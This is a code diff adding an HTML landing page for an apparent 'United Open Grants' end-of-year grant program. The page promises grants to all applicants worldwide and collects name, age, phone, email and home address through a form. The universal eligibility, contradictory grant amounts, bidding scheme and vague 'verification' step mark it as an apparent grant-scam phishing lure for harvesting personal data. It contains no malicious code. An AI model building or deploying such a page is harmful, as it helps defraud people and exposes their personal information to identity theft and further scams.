@@ -1,0 +1,63 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>United Open Grants - End-of-Year Grant Support</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 0; padding: 0; background: #f4f4f4; color: #333; }
+        header { background: #007bff; color: white; padding: 40px; text-align: center; }
+        section { max-width: 800px; margin: 20px auto; padding: 20px; background: white; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
+        h1, h2 { text-align: center; }
+        form { display: grid; gap: 15px; }
+        label { font-weight: bold; }
+        input, textarea { width: 100%; padding: 10px; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
+        button { background: #007bff; color: white; padding: 15px; border: none; cursor: pointer; font-size: 18px; border-radius: 4px; }
+        button:hover { background: #0056b3; }
+        .note { font-style: italic; color: #666; text-align: center; }
+        footer { text-align: center; padding: 20px; background: #007bff; color: white; }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>United Open Grants</h1>
+        <p>End-of-Year Grant Support Program – Grants from $500 to $50,000</p>
+    </header>
+    <section>
+        <p>Welcome to the United Open Grants end-of-year program. We are offering generous grant support to individuals worldwide. Anyone can apply by bidding a requested amount between $150 and $10,000.</p>
+        <p><strong>All applicants are eligible.</strong> Selected grants (ranging from $500 to $50,000) will be distributed on December 31, 2025.</p>
+        <p>No payment is required. After submission, your application will undergo verification, and you'll receive updates via email.</p>
+        
+        <h2>Apply Now</h2>
+        <form action="https://formspree.io/f/your-form-id" method="POST">  <!-- Replace with your actual endpoint -->
+            <label for="name">Full Name *</label>
+            <input type="text" id="name" name="name" required>
+            
+            <label for="age">Age *</label>
+            <input type="number" id="age" name="age" min="18" required>
+            
+            <label for="phone">Phone Number *</label>
+            <input type="tel" id="phone" name="phone" required>
+            
+            <label for="email">Email Address *</label>
+            <input type="email" id="email" name="email" required>
+            
+            <label for="address">House Address *</label>
+            <textarea id="address" name="address" rows="4" required></textarea>
+            
+            <label for="bid">Requested Amount (Bid: $150 - $10,000) *</label>
+            <input type="number" id="bid" name="bid" min="150" max="10000" required>
+            
+            <label for="reason">Reason for Request (Optional)</label>
+            <textarea id="reason" name="reason" rows="5"></textarea>
+            
+            <p class="note">Your information is private and used solely for verification purposes. Hold for verification after submission.</p>
+            
+            <button type="submit">Submit Application</button>
+        </form>
+    </section>
+    <footer>
+        <p>&copy; 2025 United Open Grants | Grants Announced December 31, 2025</p>
+    </footer>
+</body>
+</html>
